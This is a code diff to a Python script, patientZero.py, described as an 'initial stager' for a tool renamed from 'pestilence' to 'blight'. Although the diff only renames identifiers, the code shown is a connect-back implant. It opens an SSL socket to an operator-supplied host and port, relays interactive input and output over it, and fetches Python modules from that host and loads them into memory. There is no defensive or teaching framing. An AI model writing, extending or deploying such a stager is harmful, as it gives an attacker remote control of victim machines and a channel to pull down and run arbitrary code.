@@ -28,7 +28,7 @@ class patientZero():
             self.new_mod = "" 
             
             #connection back to source
-            self.pestilence = self.contraction()
+            self.blight = self.contraction()
 
             if not stager:
                 self.standalone_mode()       
@@ -49,7 +49,7 @@ class patientZero():
             inp = ""
 
             while True: 
-                outbound, inbound, _ = select.select([sys.stdin], [self.pestilence], [], timeout) 
+                outbound, inbound, _ = select.select([sys.stdin], [self.blight], [], timeout) 
 
                 if outbound:
                     out = sys.stdin.readline()
@@ -58,12 +58,12 @@ class patientZero():
                         break
 
                     if len(out) > 1:
-                        self.pestilence.send("%s" % out)
+                        self.blight.send("%s" % out)
                     else:
                         self.prompt()
         
                 if inbound:
-                    inp = self.get_bytes(self.pestilence)
+                    inp = self.get_bytes(self.blight)
                     if inp:
                         sys.stdout.write("\n[<.<] %s" % inp)
                         inp = ""
@@ -81,7 +81,7 @@ class patientZero():
                 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                 sock.connect((self.phost,self.port))
             except Exception as e:
-                log("[x.x] Unable to connect to pestilence source %s:%d" % (self.phost,self.port)) 
+                log("[x.x] Unable to connect to blight source %s:%d" % (self.phost,self.port)) 
                 log("[>.>] Patient Zero died: %s" % str(e))
                 sys.exit(-1)
             try:
@@ -96,7 +96,7 @@ class patientZero():
                 log("[>.>] Patient Zero died: %s" % str(e))
                 sys.exit(-1) 
 
-            log("[^.^] Pestilence contracted!")
+            log("[^.^] blight contracted!")
             return sslock
 
     
@@ -119,8 +119,8 @@ class patientZero():
 
 
         def get_package(self,package_name):
-            self.pestilence.send("import %s\n" % package_name)
-            package = self.get_bytes(self.pestilence) 
+            self.blight.send("import %s\n" % package_name)
+            package = self.get_bytes(self.blight) 
             print "[<.<] Package recieved: len:%d" % len(package)
             print "[>.>] Package start:\n%s" % (package[0:100],)
             mod = imp.new_module(package_name)
@@ -138,11 +138,11 @@ if __name__ == "__main__":
 
 
     progDesc = ("<(x.x)> ~patientZero.py~ <(x.x)>\r\n"
-                "Initial Stager for pestilence.py\n")         
+                "Initial Stager for blight.py\n")         
 
     argParser = argparse.ArgumentParser(description=progDesc)
-    argParser.add_argument("phost", help="Pestilence IP to connect back to")
-    argParser.add_argument("-p","--port", help="Pestilence port to connect back to",type=int, default=54189)
+    argParser.add_argument("phost", help="blight IP to connect back to")
+    argParser.add_argument("-p","--port", help="blight port to connect back to",type=int, default=54189)
     argParser.add_argument("-l","--log", help="Log session details to file")
     argParser.add_argument("-s","--strict",help="Care about ssl cert",action="store_true",default=False)
     argParser.add_argument("-k","--keyfile",help="Specify key (.pem)",default="key.pem")
